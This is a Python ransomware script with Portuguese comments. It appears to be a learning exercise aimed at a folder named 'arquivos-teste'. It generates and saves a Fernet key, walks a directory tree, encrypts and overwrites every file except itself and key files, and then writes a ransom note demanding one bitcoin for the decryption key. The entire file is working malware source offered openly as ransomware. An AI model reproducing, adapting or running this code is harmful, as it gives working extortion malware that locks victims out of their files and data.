from cryptography.fernet import Fernet
import os

#Gerando uma chave de criptografia e salvando-a

def gera_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)

#Carregando a chave salva

def carrega_chave():
    return open ("chave.key","rb").read()

#Criptografando um unico arquivo
def criptografa_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_encriptados = f.encrypt(dados)
    with open(arquivo,"wb") as file:
        file.write(dados_encriptados)


#Encontrando arquivos para realizar criptografia
def encontrando_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransoware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista

#Mensagem para resgate

def cria_mensagem_resgate():
    with open("LEIA ISSO POR FAVOR.TXT", "w") as f:
        f.write("Prezado, informamos que infelizmente você foi infectado e seus arquivos foram Criptografados!\n")
        f.write("Nos envie 1 bitcoin para o endereço X juntamente com o comprovante.\n")
        f.write("Após a confirmação que recebemos o pagamentos, iremos te enviar a chave correta para você recuperar seus arquivos!")


#Execução Principal
def main():
    gera_chave()
    chave = carrega_chave()
    arquivos = encontrando_arquivos("arquivos-teste")
    for arquivo in arquivos:
        criptografa_arquivo(arquivo, chave)
    cria_mensagem_resgate()
    print("Ransoware executado! E arquivos criptografados!")

if __name__ == "__main__":
    main()